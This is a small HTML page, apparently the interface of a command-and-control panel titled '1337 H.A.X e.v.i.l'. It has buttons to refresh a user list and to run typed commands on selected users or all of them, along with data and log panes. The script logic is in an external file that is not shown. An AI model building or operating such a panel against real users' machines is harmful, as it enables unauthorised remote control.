<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>Control Tool</title>
		<style>

table, tr, td {
	border: 0;
}
body {
	background-color: #000;
	color: #fff;
	font-family: monospace;
	font-size: 15px;
}
textarea {
	display: block;
	width: 100%;
	background-color: #222;
	color: #fff;
}
button {
}
table button {
	width: 120px;
}
input[type="checkbox"] {
}
label {
	display: inline-block;
	padding-right: 10px;
	margin-right: 10px;
	
	border-right: 1px solid #BBB;
	border-bottom: 1px solid #BBB;
	border-left: 1px solid #BBB;
}
.highlight {
	background-color: #380;
}
#refresh {
	margin-bottom: 10px;
	width: 100%;
}
#users {
	margin-bottom: 10px;
}
#cmd {
	min-height: 100px;
}
#run_selected, #run_all {
	width: 200px;
}
#left {
	width: 49%;
	float: left;
}
#right {
	width: 49%;
	float: right;
}
#data, #cmds {
	min-height: 250px;
	width: 100%;
}
#log {
	min-height: 150px;
}
.clear {
	clear: both;
}
		</style>
		<script src="jquery-2.1.3.min.js"></script>
		<script src="ctrl.js"></script>
	</head>
	<body>
		<h1>1337 H.A.X e.v.i.l</h1>
		<button id="refresh" onclick="refresh_users()">Refresh Users</button>
		<table id="users"></table>
		<textarea id="cmd"></textarea>
		<button id="run_selected" disabled="disabled" onclick="run_selected()" onkeypress="">Run for...</button>
		<button id="run_all" onclick="run_all()" onkeypress="">Run for ALL</button>
		<br />
		<br />
		
		<div id="left">
			<textarea id="data" readonly="readonly"></textarea>
			<label for="mode_text">
				<input id="mode_text" type="checkbox" onclick="oncheck_text()" />
				Text Mode
			</label>
		</div>
		<div id="right">
			<textarea id="cmds" readonly="readonly"></textarea>
			<label for="mode_linebreaks">
				<input id="mode_linebreaks" type="checkbox" onclick="oncheck_linebreaks()" />
				Line Breaks
			</label>
		</div>
		<br class="clear" />
		
		
		<br />
		<br />
		
		<textarea id="log" readonly="readonly"></textarea>
	</body>
</html>
